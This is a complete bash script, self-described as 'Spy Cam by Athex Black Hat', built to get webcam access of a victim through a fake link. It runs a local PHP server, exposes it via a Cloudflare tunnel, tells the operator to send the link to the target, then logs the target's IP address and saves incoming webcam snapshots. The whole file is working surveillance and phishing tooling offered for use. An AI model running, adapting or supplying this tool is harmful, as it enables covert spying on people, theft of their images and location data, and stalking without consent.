#!/bin/bash
trap 'printf "\n";stop' 2

banner() {
  printf "\e[1;92m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\e[0m\n"
  printf "\n"
  printf "\e[1;92m  ███████╗██████╗ ██╗   ██╗      ██████╗ █████╗ ███╗   ███╗  \e[0m\n"
  printf "\e[1;92m  ██╔════╝██╔══██╗╚██╗ ██╔╝     ██╔════╝██╔══██╗████╗ ████║  \e[0m\n"
  printf "\e[1;92m  ███████╗██████╔╝ ╚████╔╝      ██║     ███████║██╔████╔██║  \e[0m\n"
  printf "\e[1;92m  ╚════██║██╔═══╝   ╚██╔╝       ██║     ██╔══██║██║╚██╔╝██║  \e[0m\n"
  printf "\e[1;92m  ███████║██║        ██║        ╚██████╗██║  ██║██║ ╚═╝ ██║  \e[0m\n"
  printf "\e[1;92m  ╚══════╝╚═╝        ╚═╝         ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝  \e[0m\n"
  printf "\e[1;92m                                                                                       \e[0m\n"
  printf "\e[1;92m - - - - - - - - - - - - - - -SPY CAM BY ATHEX BLACK HAT- - - - - - - - - - - - - - - -\e[0m\n"
  printf "\e[1;92m  This Tool Is Designed To Get Webcam Access Of Victim sending him/her Fake Link       \e[0m\n" 
  printf "\e[1;92m- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\e[0m\n"
  printf "\n"
}

stop() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cleaning up...\e[0m\n"
  
  # Check and kill cloudflared
  if pgrep -f "cloudflared" > /dev/null; then
    pkill -f cloudflared > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared stopped\e[0m\n"
  fi
  
  # Check and kill PHP
  if pgrep -f "php" > /dev/null; then
    pkill -f php > /dev/null 2>&1
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] PHP server stopped\e[0m\n"
  fi
  
  # Remove temporary files
  rm -f logs/ip.txt
  
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Exiting...\e[0m\n"
  exit 1
}

check_dependencies() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Checking dependencies...\e[0m\n"
  
  # Check for PHP
  if ! command -v php > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] PHP not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    sudo apt install -y php > /dev/null 2>&1
    
    if ! command -v php > /dev/null 2>&1; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Error installing PHP. Please install it manually.\e[0m\n"
      exit 1
    fi
  fi
  
  # Check for curl
  if ! command -v curl > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Curl not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    sudo apt install -y curl > /dev/null 2>&1
    
    if ! command -v curl > /dev/null 2>&1; then
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Error installing Curl. Please install it manually.\e[0m\n"
      exit 1
    fi
  fi
  
  # Check for wget
  if ! command -v wget > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Wget not found. Installing...\e[0m\n"
    sudo apt update > /dev/null 2>&1
    sudo apt install -y wget > /dev/null 2>&1
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] All dependencies are installed!\e[0m\n"
}

catch_ip() {
  ip=$(grep -a 'IP:' logs/ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
  
  # Save IP to log file with timestamp
  echo "$(date '+%Y-%m-%d %H:%M:%S') - $ip" >> logs/captured_ips.log
  
  # Remove the temporary IP file
  rm -f logs/ip.txt
}

checkfound() {
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets...\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
  
  while true; do
    if [[ -e "logs/ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
      catch_ip
    fi

    if [[ -e "logs/log.log" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Camera Hacked File received!\e[0m\n"
      
      # Move the snapshot to a timestamped file
      timestamp=$(date +%Y%m%d_%H%M%S)
      mkdir -p captures
      mv logs/log.log "captures/snapshot_$timestamp.jpg"
      printf "\e[1;92m[\e[0m+\e[1;92m] Saved as captures/snapshot_$timestamp.jpg\e[0m\n"
    fi
    
    sleep 0.5
  done
}

install_cloudflared() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Setting up Cloudflared...\e[0m\n"
  
  # Check if cloudflared is already installed
  if command -v cloudflared > /dev/null 2>&1; then
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared already installed.\e[0m\n"
    return 0
  fi
  
  # Detect architecture
  ARCH=$(uname -m)
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Architecture detected: $ARCH\e[0m\n"
  
  # Download cloudflared based on architecture
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Downloading Cloudflared...\e[0m\n"
  
  if [[ "$ARCH" == "x86_64" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -O cloudflared
  elif [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O cloudflared
  elif [[ "$ARCH" == "armv7l" ]] || [[ "$ARCH" == "armhf" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" -O cloudflared
  elif [[ "$ARCH" == "i386" ]] || [[ "$ARCH" == "i686" ]]; then
    wget -q "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O cloudflared
  else
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Unsupported architecture: $ARCH\e[0m\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Please install Cloudflared manually from: \e[0m\n"
    printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/\e[0m\n"
    exit 1
  fi
  
  # Make it executable and move to /usr/local/bin
  chmod +x cloudflared
  sudo mv cloudflared /usr/local/bin/cloudflared
  
  if ! command -v cloudflared > /dev/null 2>&1; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Failed to install Cloudflared.\e[0m\n"
    exit 1
  fi
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared installed successfully!\e[0m\n"
  return 0
}

start_servers() {
  # Create necessary directories
  mkdir -p captures logs
  
  # Kill any existing PHP or Cloudflared processes
  pkill -f php > /dev/null 2>&1
  pkill -f cloudflared > /dev/null 2>&1
  
  # Remove any existing cloudflared log files
  rm -f cloudflared.log
  
  # Start PHP server
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting PHP server on port 3333...\e[0m\n"
  php -S 0.0.0.0:3333 > /dev/null 2>&1 &
  sleep 2
  
  # Start Cloudflared tunnel
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Cloudflared tunnel...\e[0m\n"
  
  # Start cloudflared in background and capture output
  cloudflared tunnel --url http://localhost:3333 > cloudflared.log 2>&1 &
  CLOUDFLARED_PID=$!
  
  # Wait for tunnel to establish
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for Cloudflared connection (15 seconds)...\e[0m\n"
  sleep 15
  
  # Get the Cloudflared URL
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Retrieving Cloudflared URL...\e[0m\n"
  
  cloudflared_url=""
  
  # Method 1: Check log file for trycloudflare.com URL
  if [[ -f "cloudflared.log" ]]; then
    cloudflared_url=$(grep -o 'https://[0-9a-z\-]*\.trycloudflare\.com' cloudflared.log | head -1)
  fi
  
  # Method 2: Try to get from metrics endpoint (cloudflared 2023.8.0+)
  if [[ -z "$cloudflared_url" ]]; then
    cloudflared_url=$(curl -s http://localhost:3333/.well-known/cf-attempts 2>/dev/null | grep -o 'https://[^"]*' | head -1)
  fi
  
  # Method 3: Try different pattern in log
  if [[ -z "$cloudflared_url" ]]; then
    cloudflared_url=$(grep -o 'https://.*\.trycloudflare\.com' cloudflared.log 2>/dev/null | head -1)
  fi
  
  # Method 4: Look for any URL in the log
  if [[ -z "$cloudflared_url" ]]; then
    cloudflared_url=$(grep -o 'https://[^ ]*' cloudflared.log 2>/dev/null | grep trycloudflare | head -1)
  fi
  
  # If still no URL, check if cloudflared is running
  if [[ -z "$cloudflared_url" ]]; then
    if ps -p $CLOUDFLARED_PID > /dev/null; then
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Cloudflared is running but URL not found in logs.\e[0m\n"
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Checking cloudflared.log file manually...\e[0m\n"
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Last 10 lines of cloudflared.log:\e[0m\n"
      tail -10 cloudflared.log
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Enter the Cloudflared URL manually: \e[0m"
      read cloudflared_url
    else
      printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Cloudflared failed to start. Check cloudflared.log for details.\e[0m\n"
      printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] You can view the log with: cat cloudflared.log\e[0m\n"
      exit 1
    fi
  fi
  
  # Clean up the URL
  cloudflared_url=$(echo "$cloudflared_url" | tr -d '[:space:]')
  
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Cloudflared tunnel established!\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Send this link to the target: \e[0m\e[1;77m%s\e[0m\n" "$cloudflared_url"
  
  # Also show the local URL
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Local URL: \e[0m\e[1;77mhttp://localhost:3333\e[0m\n"
  
  # Save the URL to a file for reference
  echo "$cloudflared_url" > cloudflared_url.txt
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] URL saved to cloudflared_url.txt\e[0m\n"
  
  # Start monitoring for connections
  checkfound
}

# Main execution
clear
banner
check_dependencies
install_cloudflared
start_servers
